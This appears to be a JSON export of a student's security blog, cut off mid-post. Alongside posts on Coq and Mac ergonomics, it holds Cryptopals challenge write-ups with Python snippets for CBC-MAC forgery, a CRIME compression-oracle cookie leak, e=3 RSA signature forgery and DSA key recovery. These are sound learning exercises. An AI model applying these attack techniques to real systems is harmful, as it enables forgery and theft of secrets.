{"meta":{"title":"Tack, Hunt, Pool","subtitle":null,"description":"Where I keep all the stuff that doesn't fit in my head","author":"Ray Wang","url":"http://raywang.tech"},"pages":[{"title":"About Me","date":"2017-03-09T09:34:05.000Z","updated":"2017-04-05T00:21:45.000Z","comments":true,"path":"about/index.html","permalink":"http://raywang.tech/about/index.html","excerpt":"","text":"I'm a student studying computer science at the Massachusetts Institute of Technology. I'm interested in computer security, and I compete with my team, TechSec, in Capture the Flag competitions year-round. This humble blog is mostly a reference for my forgetful future self. I'll be posting CTF writeups, projects I'm working on, things I'm currently learning. I hope that other curious netizens may glean something useful from my blog as well. -- 3/10/17 Get in touch with me at raywang@mit.edu!"},{"title":"Categories","date":"2017-03-10T05:56:35.000Z","updated":"2017-03-10T05:58:29.000Z","comments":true,"path":"categories/index.html","permalink":"http://raywang.tech/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2017-03-10T05:37:46.000Z","updated":"2017-03-10T05:58:31.000Z","comments":true,"path":"tags/index.html","permalink":"http://raywang.tech/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Formal Reasoning in Coq — a Beginner's Guide","slug":"formal-reasoning-in-coq","date":"2017-09-25T14:12:00.000Z","updated":"2017-09-29T19:08:40.000Z","comments":true,"path":"2017/09/25/formal-reasoning-in-coq/","link":"","permalink":"http://raywang.tech/2017/09/25/formal-reasoning-in-coq/","excerpt":"","text":"I'm currently taking the Fall 2017 iteration of 6.826, Principles of Computer Systems. This class has been offered in various forms over the years, but this iteration is quite different. It focuses on formal verification of computer systems using Coq, a language for mechanical theorem proving. The goal of this class is to write the spec, implementation, and proofs for a formally verified RAID filesystem in Coq, then generate Haskell code from it. &lt;!-- more --&gt; I've been quite curious about the field of formal verification since I first learned about it last semester. I couldn't fit Adam Chlipala's FRAP (Formal Reasoning About Programs) into my schedule, but I didn't want to miss out on Zeldovich and Kaashoek's PoCS class because it seemed more practical in nature. This is the first in a series of posts on approaching Coq and formal verification as a complete beginner. Environment Setup I'd heard good things about using Emacs + Proof General for Coq, so I started using Spacemacs, which combines vim's editing modes and keybindings with Emacs'. I haven't tried the default CoqIDE or Coquille in vim, but Emacs' Coq support is pretty great. With company-coq and spacemacs-coq layers, there's not much more you could ask for. If you're coming from vim, Spacemacs is a little obnoxious to get set up, though. The Coq integration is a Spacemacs 'layer', which is a set of configurations for a specific task. Make sure that the Coq layer activates upon opening a .v file. Perhaps I'll do another post about all the editors I use daily — Vim, Sublime, Atom, and Spacemacs — (I'm a mongrel, I know), but for now, I'll just direct you to some Spacemacs resources. Tactics, Datatypes, and Coq commands Software Foundations is the best place to start getting your feet wet. The first three chapters, Basics, Induction, and Lists, .... When you open a .v Coq file in Spacemacs, Coq mode should be activated. You should now be able to access company-coq commands with the Ctrl-C leader, and if you have spacemacs-coq, there's some common commands under the , leader. Start the proof using proof-goto-point or an alias for it, and you'll be able to see the goal you're proving and the context, containing your variables and hypotheses, in a pane on the right. Note that the Coq process can only be active in one buffer at a time, so you can't have proofs running simultaneously in several files. Once you've learned the basic syntax, you should also do the Emacs company-coq-tutorial to learn about all the IDE-like helpers that the layer provides. Coq objects Here are some of the most important constructs in Coq: Definition, Function, Fixpoint, and Inductive Inductive defines inductive types. Function and Fixpoint are for recursively defined functions on inductive types. Note that Fixpoints must be obviously decreasing on each recursive call, or else Coq will complain. Built-in datatypes such as Nat, List, Prop, Bool. Theorem, Lemma, Proof match statements ( familiar from any other functional language ) Getting started with tactics The first three chapters of SF will teach you a few basic tactics — namely, induction, assert, simpl, reflexivity, rewrite, apply, replace. Nearly all the the exercises can be completed with just these. Once you get sufficiently advanced, you'll be able to identify when magic commands like auto or omega will just solve the rest of your proof for you. info_auto will show you the tactics that auto is using. You'll start to notice patterns when dealing with basic structures. If you see a recursive data structure, you can use induction to generate subgoals for each of the constructors. This cheatsheet is invaluable for most of the tactics you'll ever need. I also found this site useful for the few most basic tactics. When you first start out, it's useful to be able to search for library lemmas, theorems, definitions, notation, etc. The Search ___ command will look for definitions and theorems. If you quote the search string like &quot;eqb&quot;, it will look for all theorems with that as a substring. Locate can look up constants or notation, like &quot;?=&quot;. To insert the outputs of the last command as a comment (so you can refer to it without having to rerun it), spacemacs-coq provides the key sequence , ;. Proving binary search trees (and pitfalls) We are given a tree, defined as follows: 12345678(* A `nattree` is a tree of natural numbers, where every internal node has an associated number and leaves are empty. There are two constructors, L (empty leaf) and I (internal node). I's arguments are: left-subtree, number, right-subtree. *) Inductive nattree : Set := | L : nattree (* Leaf *) | I : nattree -&gt; nat -&gt; nattree -&gt; nattree. (* Internal nodes *) We have to define a binary search function and a function to test whether a tree is a BST, then write proofs about the correctness of our functions. We want to prove, among other things, that our BST tester does indeed enforce the sortedness of left and right subtrees, and that binsearch can indeed find every element in the tree. My first attempt was a disaster, ending with convoluted proofs that would have gotten progressively harder had I not stopped and asked for help. I'll talk about some of the pitfalls I made, and then discuss how everything went smoother on the second try. Pitfall 1: The Bool and Prop worlds Coq has two worlds: computational (Type) and logical (Prop). Booleans exist in the computational world. As this answer explains, Essentially, Coq has both because they are useful for different things: booleans correspond to facts that can be checked mechanically (i.e., with an algorithm), whereas propositions can express more concepts... If b : bool represents a statement, we can assert that this statement is true by saying b = true, which is of type Prop. Note that Props can be used in proofs, but not in functions. To relate the two, we need theorems that translate between Bool and Prop, as I quickly and painfully discovered. Take a look at my initial definition of binsearch on a nattree t. 1234567891011match t with | L =&gt; false | I l n r =&gt; match beq_nat x n with | true =&gt; true | false =&gt; match Nat.ltb x n with | true =&gt; binsearch x l | false =&gt; binsearch x r end end end end. This seems reasonable, right? However, the beq_nat (an alias for Nat.eqb) and Nat.ltb return Bools, not Props! So, when we want to use hypotheses like x &lt; n (a Prop) to prove (x &lt;? n) = true, it's not immediate because they're in two different worlds![1] We need a lemma in Coq like 1Lemma ltb_lt n m : (n &lt;? m) = true &lt;-&gt; n &lt; m. To illustrate this more, how about proving the proposition that (x &lt;? n) = false given x &gt; n? First we have to do something ugly like 1rewrite &lt;- Bool.not_true_iff_false, Nat.ltb_lt. which changes the goal like: 12345678__________________(x &lt;? n) = false__________________(x &lt;? n) &lt;&gt; true__________________~ x &lt; n and only then will omega be able to solve it. Second attempt What can we do instead? The better construct is 123456789Function binsearch (x:nat) (t:nattree) : bool :=match t with| L =&gt; false| I l n r =&gt; match x ?= n with | Eq =&gt; true | Lt =&gt; binsearch x l | Gt =&gt; binsearch x r end end. The ?= is Nat.compare, which returns a comparison type, defined below: 1234Inductive comparison : Set := | Eq : comparison | Lt : comparison | Gt : comparison. With this cleaner definition, in proofs we can use the destruct_compare tactic defined for us to get three cases: x &lt; n, x = n, x &gt; n. Pitfall 2: Non-recursive definitions Observe these two definitions of btree_sorted, which checks a tree is a valid BST. 1: 1234567891011Fixpoint isAscendingProp (t: list nat) : Prop := match t with | nil =&gt; True | cons h tl =&gt; match tl with | nil =&gt; True | _ =&gt; and (Nat.le h (hd 0 tl)) (isAscendingProp tl) end end.Function btree_sorted (t:nattree) : Prop := isAscendingProp (flatten t). 2. 12345Function btree_sorted (t:nattree) : Prop := match t with | L =&gt; True | I l n r =&gt; btree_le l n /\\ btree_ge r n /\\ btree_sorted l /\\ btree_sorted r end. 1 is flattening the tree via in-order traversal, then checking that each element in the list is $\\leq$ the next element. This would lead to more work when writing proofs, since I would need more lemmas about isAscendingProp that related non-adjacent elements. Writing recursive definitions as in 2 should make life easier. As my TA said, you want the definition to match how you're writing the proof. Aside: Using List lemmas In my final solution, all my functions were recursive except btree_in, for determining membership in a list. 12Function btree_in (x:nat) (t:nattree) : Prop := In x (flatten t). If you get comfortable with the List library, then this shouldn't be a problem. The In function has some nice lemmas. I used this one a lot: 1Lemma in_app_or : forall (l m:list) (a:A), In a (l ++ m) -&gt; In a l \\/ In a m. to split up 1H0: In x (flatten t1 ++ n :: flatten t2) into 1H0 : In x (flatten t1) \\/ n = x \\/ In x (flatten t2) Identifying patterns I found myself repeating the same tactic patterns in my proofs. For example, when I have a series of /\\ like A /\\ B /\\ in my hypotheses, I can split them up using destruct_pairs, allowing me to use each clause individually because I know each one must be true. If there's a series of \\/ in a hypothesis, you need to use multiple destructs. For example, I often ended up having H0 : In x (flatten t1) \\/ n = x \\/ In x (flatten t2) in my context, and my goal was to prove one of those clauses. Well, I would use destruct to consider each case individually, showing that the other two non-goal clauses resulted in contradictions. Therefore, my own goal must be true. Conventions and sugar In Basics.v of SF, you'll find best practices on organizing proofs. I like to use nested bullet points -, +, and *, in that order, to focus subgoals whenever I am doing cases, induction, or destruct. When I have an assert, I wrap the proof of the assert in {}. Hopefully, you learned some pointers to get you more productive in Coq! There's not many clear, beginner-oriented resources out there, so all of this post was constructed with trial and a lot of error. Resources Spacemacs Cheatsheet Spacemacs for Vim users &lt;?, btw, is the notation for ltb, which you could have looked up with Locate &quot;&lt;?&quot;. ↩","categories":[{"name":"Languages","slug":"Languages","permalink":"http://raywang.tech/categories/Languages/"},{"name":"Formal Methods","slug":"Languages/Formal-Methods","permalink":"http://raywang.tech/categories/Languages/Formal-Methods/"}],"tags":[{"name":"Coq","slug":"Coq","permalink":"http://raywang.tech/tags/Coq/"}]},{"title":"Matasano Crypto Challenges, Set 7","slug":"matasano-crypto-challenges-set-7","date":"2017-09-11T14:54:00.000Z","updated":"2017-09-29T13:02:42.000Z","comments":true,"path":"2017/09/11/matasano-crypto-challenges-set-7/","link":"","permalink":"http://raywang.tech/2017/09/11/matasano-crypto-challenges-set-7/","excerpt":"","text":"Into uncharted waters we venture... this set has some various problems about famous real-world vulnerabilities, and it was challenging. fortenforge and I worked together quite a bit to get through it. &lt;!-- more --&gt; One important life pro tip: os.urandom() is BLOCKING in python. That means, even multiprocessing code will not have any speedup because of this function! Try this snippet off StackOverflow instead: bytearray(random.getrandbits(8) for _ in range(num_bytes)) Challenge 49 CBC-MAC Message Forgery This attack emphasizes two things: that CBC-MAC should use a constant IV, and that it is vulnerable to length extension. For the first part, the attacker controls the IV used by CBC-MAC. We want to construct a valid message of the form &quot;from=victim&amp;to=attacker&amp;amount=1000&quot;. First, the attacker generates a valid message and MAC from an account that he controls (say, an accomplice), like &quot;from=normal&amp;to=attacker&amp;amount=1000&quot;. Then, the attacker generates the correct IV to turn normal into victim, as follows: 12345678evil_msg = \"from=victim&amp;to=attacker&amp;amount=1000\"evil_padded = padPKCS7(evil_msg, 16)# We're xoring the forged message and normal_msg to get the difference between the two, and then applying it to the ivforged_iv = xor(evil_msg[:16], normal_msg[:16], iv)forged_mac = CBC_MAC(key, forged_iv, evil_padded)assert forged_mac == mac This forged mac will now be verified by the API server. One thing that confused me is how the attacker would be able to know the private key to communicate with the server, allowing him to construct such a message. This makes sense when the challenge explains: [The API is] publicly exposed - the attacker can submit messages freely assuming he can forge the right MAC. The web client should allow the attacker to generate valid messages for accounts he controls. Assume the attacker is in a position to capture and inspect messages from the client to the API server. The important thing is that the attacker can generate MACs using the private key for accounts that he controls, but not for someone else's account. In the second part of this challenge, the attacker uses length extension to append an evil string &quot;attacker:10000&quot; to a recipients list in a victim's transaction. The attacker first generates a MAC for a valid message that names him as a recipient (say, a transaction from himself to himself). He then intercepts a normal message like &quot;from=victim&amp;tx_list=normaluser:1&quot;, and xors in his own message at the end, causing the resultant MAC to become his own MAC. 12345678910attacker_valid_msg = construct_message(\"hello\", (\"attacker\", 10000), (\"attacker\", 10000))attacker_padded = padPKCS7(attacker_valid_msg, 16)attacker_mac = CBC_MAC(key, iv, attacker_padded)# XOR out normal_mac to reacquire an IV of 0, then XOR in the first block of the attacker's msgevil_msg = padded + xor(normal_mac, attacker_padded[:16]) + attacker_padded[16:]print \"C-&gt;A-&gt;S: Sending Attacker Message + MAC\"r.sendline(evil_msg)r.sendline(attacker_mac) Challenge 50 Hashing with CBC-MAC This is a simple modification of the length extension of the last challenge. My evil javascript payload is an alert with a comment at the end. 12forge = \"alert('Ayo, the Wu is back!');//\"forge_padded = padPKCS7(forge, 16) and, to ensure I get the same hash as the challenge snippet, 296b8d7cb78a243dda4d0a61d33bbdd1, I need to extend the CBC-MAC of the JS payload with the challenge snippet. I can simply add a block in the middle to xor out the MAC of the payload, ensuring that the rest of the CBC-MAC is identical to the original. 1concat_forge = forge_padded + xor(mac, js_padded[:16]) + js_padded[16:] Challenge 51 Compression Ratio Side-Channel Attacks, Aka, CRIME This has got to be the ugliest code I've written in a while, because my initial approach was bad... In this challenge, we use the side channel of zlib compression to leak a session cookie in an HTTP request. Without knowing much about the internal DEFLATE algorithm of zlib, just realize that repeated strings compress better. So, the basic idea is to bruteforce the session id by seeing whether added characters minimize the compression — telling us that the added characters are a part of the session id. I attempt to minimize scores by adding pairs of characters, but that turned out to be unnecessary. I also utilized python's multiprocessing library, which was also totally overkill. 12pool = mp.Pool(processes = 8)compression_lens = pool.map(compression_oracle_worker, base64_permutations) When we are using CTR as the compression cipher, it's pretty simple, since there's no padding involved. Correct guesses for more characters of the id will result in lower compression lengths. When using CBC, we have to be concerned with padding. Instead of simply minimizing the compressed length, I need to use another piece of information to determine when I've guessed the right characters — a padding oracle. I put in some uncompressible guess for the id and find the padding necessary to push the compressed length above a block boundary. Once I find the correct id characters, then the compressed length will be a block length (16 bytes) lower than the uncompressible guess, because I've compressed it below the block boundary. The set of characters !@#$%^&amp;*()-`~[]}{ can be used as padding, because they are not base64 characters and will not appear in the session id. I had to do a few hacky things to get it all to work, though: I need to test two padding lengths for each guess, since my guesses are all possible pairs of base64 characters. And, python's Pool.map doesn't take multiple arguments, so I have to pass in a list of lists to my oracle worker. 12base64_perms = [[padding[:-1], final + \"\".join(perm)] for perm in it.permutations(base64_chars, 2)]base64_perms += [[padding[:-2], final + \"\".join(perm)] for perm in it.permutations(base64_chars, 2)] Challenge 52 Iterated Hash Function Multicollisions The next three challenges all involve attacks on the Merkle-Damgard hash construction. We encountered this previously with MD5 and SHA1, and we'll be using a specifically weakened version in these challenges. The basic idea in this challenge is that, once we find an initial collision of an iterated hash function, we can generate a ton more by extending that initial collision. The relevant paper is Joux. The key figure is ![Multicollision Construction Joux](/images/2017/09/Screenshot 2017-09-11 12.48.58.png). We can see that we can construct colliding messages by selecting one of $B_i$, $B_i'$ for each $i$, giving us a total of $2^i$ colliding messages. Each message has the same intermediate hash values, $h_0, h_1...$. Now that we have a cheap way to generate collisions (if we ever need more, we can double how many collisions we have with very little work), we can break a cascaded hash function that just concatenates a weak hash and a strong hash. In my code, my &quot;weak&quot; hash is a Blowfish cipher truncated to 2 bytes of output, and my &quot;strong&quot; hash is truncated to 3 bytes of output. We can simply search in our pool of weak hash collisions for a pair of messages that also collides in the strong hash. No luck? Then double the number of weak hash collisions (easy!) and keep looking... Challenge 53 Kelsey and Schneier's Expandable Messages It took me a little bit to understand this attack. The best explanation is Schneier's paper here.. The goal here is to break second preimage resistance — as the challenge states, finding $x'$ such that $H(x') = H(x) = y$. Remember that, in the iterated hash function construction, if the internal hash state of two different messages are ever equal, then we can make sure that all following hash states, including the output, will be equal (by ensuring that the messages don't differ after this point). So, if we have a very long message of $2^R - 1$ blocks, we have $2^R$ intermediate hash states that we can potentially collide with, decreasing the difficulty of finding a second preimage. However, length padding screws this up. MD construction calls for the length of the message to be appended to the message before the final hash is output, which prevents the above attack. We are forced to find a colliding message of length $2^R - 1$! Fortunately, we can bypass this defense with expandable messages that allow us to actually construct a message of this length very easily. We first find pairs of colliding messages, where each pair consists of a single-block message and a message of length $2^{k-1} + 1$. Each pair's initial hash state is the colliding hash of the previous pair. This is our expandable message. ![Expandable message](/images/2017/09/expandable message diagrams.png) When we want to construct a message of length between $k$ and $k + 2^k - 1$, we can create it by concatenating pieces of our expandable message (you might already be able to see how if you are familiar with binary search). For each block in our chain, we can either append the single-block message or the $2^{i} - 1$ message, allowing us to build a message of any length that hashes to the same output as the others. The result will look something like this: So, all that remains to get our second preimage is to find a single &quot;bridge&quot; block that will allow our expandable message to hash to one of the intermediate states of the long message. Once we find this block, which collides with the $n$th intermediate hash state of the long message, we simply produce a message of length $n$ in the manner shown above. 12345# Where prefix is generated from our expandable messageprefix = generate_prefix(intmed_state_hash_index)second_preimage = prefix + linking_blocksecond_preimage += target_long_msg[len(second_preimage):] Challenge 54 Kelsey and Kohno's Nostradamus Attack This challenge deals with another kind of preimage resistance — we want to make a prediction about some event that hashes to some output $H$, and after the event has passed, create a correct &quot;prediction&quot; that also hashes to $H$, thus convincing people that we knew the results of the event beforehand. This attack is also known as the &quot;herding&quot; attack, and it's easy to see why. The basic premise is to construct a &quot;collision tree&quot; by selecting a bunch of starting hash states, finding message blocks under which pairs of these states collide, and building up a binary tree to a root hash state. The paper calls this tree a &quot;diamond structure&quot;, and it's very easy to produce. ![](/images/2017/09/Screenshot 2017-09-11 17.50.41.png) Once we have the collision tree, we can choose our prefix (the actual result of the event) and append some glue blocks so that the last one collides with one of the leaves in our tree. Then, as the challenge says &quot;Follow the path from the leaf all the way up to the root node and build your suffix using the message blocks along the way.&quot; Challenge 55 MD4 Collisions To be honest, this challenge makes everything else look like chump stuff. fortenforge and I worked on this together for several days, and when I got tired of it, he soldiered on, ending up with a beautiful MD4 collision. I'll refer you to his writeup in lieu of explaining it myself, and he deserves all the credit for this excellent piece of work. Challenge 56 RC4 Single Byte biases This seems like a pretty silly challenge, and I couldn't get it to work. We basically trust this paper that says that the RC4 encryption function is biased towards certain bytes at certain byte positions — byte 0, 16, 32, etc. For instance, the RC4 ciphertext's 16th byte is biased towards 0xF0. To quote the paper, Suppose byte $Z_r$ of the RC4 keystream has a dominant bias towards value 0x00. As RC4 encryption is defined as $C_r = P_r ⊕ Z_r$, the corresponding ciphertext byte $C_r$ has a bias towards plaintext byte $P_r$. Thus, obtaining sufficiently many ciphertext samples $C_r$ for a fixed plaintext $P_r$ allows inference of $P_r$ by a majority vote: $P_r$ is equal to the value of $C_r$ that occurs most often. Unfortunately, you need to RC4 encrypt a ton of messages under random keys for this to work, which takes a lot of time, and the results were not at all good for me, even with $2^{24}$ encryptions for each byte. 12345678910111213def attack_byte(idx): chars = &#123;char: 0 for char in range(256)&#125; padding = 'A'*(15 - idx) for i in range(2**20): if i % (10**6) == 0: print(\"Iteration: \", i) ctext = rc4_oracle(padding) guess = ctext[15] ^ 0xf0 chars[guess]+= 1 max_char = max(chars.items(), key = op.itemgetter(1))","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"Protips for Speed (And Reducing RSI) for Programmers or Mac Users","slug":"Protips-for-speed-and-reducing-RSI-for-programmers-or-Mac-users","date":"2017-08-13T23:23:45.000Z","updated":"2017-08-14T06:23:35.000Z","comments":true,"path":"2017/08/13/Protips-for-speed-and-reducing-RSI-for-programmers-or-Mac-users/","link":"","permalink":"http://raywang.tech/2017/08/13/Protips-for-speed-and-reducing-RSI-for-programmers-or-Mac-users/","excerpt":"","text":"I've been wanting to write this post for a while — here I'll describe all the excellent customizations that I've accrued over several years of optimizing my Mac for speed and alleviating repetitive stress injury (RSI). If you're a Mac power user, or if you make a living at a keyboard, you want to read this. &lt;!-- more --&gt; Preventing or reducing RSI If you've never experienced RSI, I'm jealous. Programming for just a few years has given me mild to excruciating amounts of wrist pain, finger pain, and elbow pain, and I'm still just a student! The small investment in an ergonomic setup could save you a lot of trouble later. Here are some things that help: Gel wrist rest My first ergonomic venture was a 3M gel wrist rest off of Amazon. It's lasted two years so far and has been great to keep the sharp edge of my Macbook from digging into my wrists. It also elevates your hands above the keyboard so that typing is more comfortable. I'm now inseparable from my wrist rest, and it's also gotten me some extra screening from airport security... Compression gloves If you have finger joint soreness, compression gloves are a must. I've tried many different pairs (comparing price and compression level), and I think IMAK has pretty good ones. They're quite delicate and can tear after extended use, but they provide much better compression and fit than cheaper, thicker gloves. Even if you don't have any pain, I recommend getting a pair. They make typing much more pleasurable, especially in cold weather. Ergonomic mouse and trackpad I also tried a few ergo mice before settling on the J-Tech mouse. It has both Bluetooth and wired versions, and it works great on a Mac. You can see in the photo the wonderful detachable platform on which you rest the bottom of your palm, keeping it off the table. There's also two thumb-side buttons that you can customize, as I'll mention later. Much less finger pain than using a trackpad or a conventional mouse. Get a trackpad with a wrist rest (either foam or gel, your pick), while you're at it. Standing desk A full standing desk is definitely too pricey, but there are cheaper solutions out there. One that serves its purpose for only $35 is this guy. It's good to alternate standing and sitting, and this portable one is light as air and easy to set aside, but still sturdy. Adjusting it is a pain, though. Ergonomic keyboards I've recently started using the Microsoft Natural 4000 at work, and it puts less strain on the fingers than the default Mac keyboard. The built-in wrist rest and sloping contours are comfortable, though it's quite a large keyboard and my small hands stretch to reach some keys. For the power user, justaperson will testify that the Ergodox-EZ, at $300, is not cheap, but certainly worth it. It comes in two pieces so that you can arrange your hands at shoulder width, which is the optimal position for ergonomics. There's software to program the keys however you want, and you can get versions with or without printed keycaps. And if you're a fan of mechanical keys, you can choose your preferred type. Note that it takes some getting used to, as justaperson can tell you, but he now uses it all the time. Mac Customizations My Mac environment has layers of speedups, shortcuts, and tricks, some of which are so superb that I don't know how anyone works without them. Here goes: BetterTouchTool I've been using BetterTouchTool for years, and it's absolutely incredible. The sheer number of features that now exist, including its mouse, trackpad, touchbar, keyboard integrations, allow any shortcut imaginable. When people ask me, &quot;how the hell are you doing _______ on your Mac??&quot;, my answer is probably BetterTouchTool! Here are my best customizations that Mac users will salivate over: Window resizing by holding option and dragging mouse anywhere in the window Window moving by holding ⌘ and dragging mouse anywhere in the window ⌘+E opens the amazing BetterTouchTool Window Switcher. Miles better than ⌘+Tab Opt+Ctrl+T to open a Finder window from anywhere I've mapped a ton of Opt+letter or arrow keys to snap a window to a corner, half, or third of the screen. Now that I use the J-Tech mouse, I've mapped the two extra buttons to the Window Switcher as well. MAGIC!! The best part is that it's pay-what-you-want (with a measly minimum of $6), while its functionality feels like it's worth as much as the Mac itself. Karabiner This nifty, free keyboard customizer can do key modifications ranging from simple to mind-boggling, per-keyboard profiles, and more. I don't have many shortcuts, but I appreciate being able to map Return to Ctrl, so I put less strain on my left pinky, which often occurs when using tmux, vim or emacs (look up emacs pinky!). If I press Return alone, it enters a line break, but if I hold it and press another key, I get Ctrl functionality. Neat! I also sometimes remap Microsoft keyboards to make the left-corner keys more like a Mac's Ctrl, Option, and ⌘. For MacOS Sierra, you'll need Karabiner-Elements, a beta version which provides much the same functionality. Copy'Em Paste STOP SWITCHING WINDOWS TO PASTE MULTIPLE THINGS! Everyone needs a good clipboard manager, no matter what platform you're on. Copy'Em Paste is everything you'll ever need from one. I love that it has a customizable hotkey, favorites, search, image clipping, and option to paste richtext or plaintext. It's well worth the $15 price tag, though I won't say where I got mine... Multiple Desktops Many Mac users may already know about Multiple Desktops, but here's a nice hack: Each desktop is associated with a specific task, and you can use Ctrl+number hotkeys to quickly switch to what you need. For instance, you can put music in Desktop 8, a terminal in Desktop 7, email in Desktop 9, and navigating to each becomes muscle memory. I learned this trick from firescar a few years ago. He was doing this on Linux, and I discovered that Multiple Desktops give the same effect on Macs. iTerm2 iTerm is strictly better than Mac's built-in Terminal. If you don't have it, make the switch right now. Its endless customizations and even a black-magic tmux integration mode are a boon for programmers who use their terminal more than their browsers. I also switched from bash to zsh for the awesome plugins that make the terminal 1000x better. Here's the best zsh plugins I use: fasd — Never cd to a full pathname again! This plugin remembers your previous working directories, so you can simply type part of a directory name and it will automatically go to the most recent/most used folder that matches fuzzy search osx — Simple shortcuts like ofd to open the present working directory in a Finder window. Pretty cool, right? history-substring-search — Instead of Ctrl+R for a shitty back-search, simply type a partial command and press the Up arrow to get a fuzzy search to recent matches. Running previous commands has never been easier... git — Dozens of aliases for git. Enough said. You're welcome!","categories":[{"name":"Meta","slug":"Meta","permalink":"http://raywang.tech/categories/Meta/"}],"tags":[]},{"title":"Looking Towards Summer: Concolic Execution, Fuzzy Panda, and More","slug":"2017/Looking towards Summer: Concolic Execution, Fuzzy Panda, and more","date":"2017-05-23T06:55:00.000Z","updated":"2017-05-23T06:55:30.000Z","comments":true,"path":"2017/05/23/2017/Looking towards Summer: Concolic Execution, Fuzzy Panda, and more/","link":"","permalink":"http://raywang.tech/2017/05/23/2017/Looking towards Summer: Concolic Execution, Fuzzy Panda, and more/","excerpt":"","text":"It's always bothered me that MIT or MIT Lincoln Lab didn't submit anything to DARPA's Cyber Grand Challenge. With all the smart people, such as my advisor, Armando Solar-Lezama, working on program analysis and formal methods (which I currently know nothing about), I would have expected that we could create a strong Cyber Reasoning System worthy of CGC. That's sort of what I will be working on this summer at Lincoln and probably writing my thesis on. But I'm very new to the field and have just started diving in. &lt;!-- more --&gt; I will primarily be engineering on panda, LL's dynamic analysis platform. I will first need to implement record-replay for PowerPC, because that's what a lot of embedded devices are still programmed in. More on this later... &lt;/br&gt; Anyways, I've decided that I'm going to take 6.035 again in Fall, but this time in Haskell. The fall version will have a language much simpler semantics but is going to be very optimization-heavy. I'd like to get the experience in functional programming, as well as implement the optimizations that I didn't get to this semester. I still want to get better at Rust, though, so I will continue working on this Spring's version of 035, the MITScript dynamic language. I would like to get the code generator fully working and integrate a generational GC. Thank goodness I have JustAPerson around to help me debug Rust. For the sake of learning Haskell and LLVM, I'll try to follow the Kaleidoscope tutorial. JustAPerson seems to think I won't be able to handle 6.035 in Haskell unless I spend the whole summer practicing. Fortenforge and I will also be finishing the Matasano Crypto Challenges and working on a packet analysis framework for Lab RATs to use at DEF CON this summer. Many things to do!","categories":[{"name":"Meta","slug":"Meta","permalink":"http://raywang.tech/categories/Meta/"},{"name":"Research","slug":"Meta/Research","permalink":"http://raywang.tech/categories/Meta/Research/"}],"tags":[{"name":"Symbolic Execution","slug":"Symbolic-Execution","permalink":"http://raywang.tech/tags/Symbolic-Execution/"},{"name":"Panda","slug":"Panda","permalink":"http://raywang.tech/tags/Panda/"},{"name":"Program Analysis","slug":"Program-Analysis","permalink":"http://raywang.tech/tags/Program-Analysis/"}]},{"title":"Matasano Crypto Challenges, Set 6","slug":"2017/Matasano Crypto Challenges, Set 6","date":"2017-05-21T13:40:00.000Z","updated":"2017-05-21T13:41:45.000Z","comments":true,"path":"2017/05/21/2017/Matasano Crypto Challenges, Set 6/","link":"","permalink":"http://raywang.tech/2017/05/21/2017/Matasano Crypto Challenges, Set 6/","excerpt":"","text":"The last of the original crypto challenges... here we go! Challenge 41 Implement unpadded message recovery oracle Unpadded RSA is homomorphic, meaning that, if operations like multiplication and addition are carried out on ciphertext, it is as if the same operation were applied to the plaintext. &lt;!-- more --&gt; This can have many useful properties, but also produces some consequences. This challenge is analogous to a &quot;security game&quot; that tests for a property known as IND-CCA2 — indistinguishability under Chosen Ciphertext Attack, where the adversary has access to a decryption oracle. The challenger gives the adversary a ciphertext, and the adversary can ask for the encryption and decryption of anything he wants — except the challenge ciphertext, of course! If the adversary can learn any information about the ciphertext's plaintext, then he wins the game. A fully homomorphic scheme fails IND-CCA2 — the adversary can completely recover the message! The adversary can't ask for the decryption of the challenge ciphertext, but he can ask for the decryption of 2*ciphertext, or 3*ciphertext, etc. and he knows that the result will be 2*plaintext, 3*plaintext. Just divide out the scaling factor, and you have the plaintext. Challenge 42 Bleichenbacher's e=3 RSA Attack Another worry with low public exponent is that the message block, when encrypted, will not be large enough to wrap the modulus. A faulty PKCS 1.5 padding verifier might not check that all the \\xff bytes in the middle are present. Here's an example of two faulty verifier versions: 12345678# Find the 00 separator between the padding and the payloadsep_idx = clearsig.index('\\x00', 2)# vulnerable python-rsa version, taking all the remainder of string after asn1 as the hashsignature_hash = clearsig[sep_idx+len(sha1_asn1)+1:]# weaker version, taking only the next 20 bytes as hash, allowing us to append garbagesignature_hash = clearsig[sep_idx+len(sha1_asn1)+1:sep_idx+len(sha1_asn1)+1+20] Looking at the weaker version, it's very simple to construct a message block meeting those parameters. 123msg_hash = hashlib.sha1(msg).digest()garbage = '\\x00'*75forge_sig = \"\\x00\\x01\\xff\\x00\" + sha1_asn1 + msg_hash + garbage and then, we simply take the cube root of this forged sig, which undoes the encryption (a cubing). 12(cube_root, exact) = gmpy2.iroot(forge_sig_num, 3)cube_root += 1 The cube root will verify to a valid signature in the faulty padding verifier. Challenge 43 DSA key recovery from nonce The DSA signature scheme uses two cyclic groups. One large cyclic group, $Z_p^{*}$, has an order of a 1024 bit prime. Another cyclic group, $Z_q^{*}$, has an order of a 160 bit prime. A DSA signature is generated and verified as follows: Signing: Choose a random ephemeral key $0 &lt; k_e &lt; q$ Compute $r \\equiv \\alpha^{k_e} \\mod q$ Compute $s \\equiv (SHA(x) + d\\cdot r) k_e^{-1}\\mod q$ Verifying: Compute aux value $w \\equiv s^{-1} \\mod q$ Compute aux value $u_1 \\equiv w \\cdot SHA(x) \\mod q$ Compute aux value $u_2 \\equiv w \\cdot r \\mod q$ Compute $v \\equiv \\alpha^{u_1}\\cdot \\beta ^{u_2} \\mod p) \\mod q$ Verify $v \\equiv r \\mod q$ 1234567891011121314151617181920def dsa_sign(msg, d): k_e = random.randint(0, q) r = pow(g, k_e, p) % q x = bytes2int(hashlib.sha1(msg).digest()) s = ((x + d*r)*modinv(q, k_e)) % q return (r,s)def dsa_verify(msg, r, sig, B): x = bytes2int(hashlib.sha1(msg).digest()) #compute aux value w s_inv = modinv(q, sig) u_1 = s_inv*x % q u_2 = s_inv*r % q v = (pow(g, u_1, p) * pow(B, u_2, p) % p) % q return v == r%q To recover the private key if we know $k$, we just solve for $x$ in the equation for $s$: $$ d = (\\frac{s\\cdot k_e - SHA(x)}{r} \\mod q $$ Challenge 44 DSA nonce recovery from repeated nonce Let's work out how we can recover the k given a pair of messages that use repeated k. $$ \\begin{align} s_1 - s_2 &amp;= (m_1 + dr)k^{-1} - (m_2 + 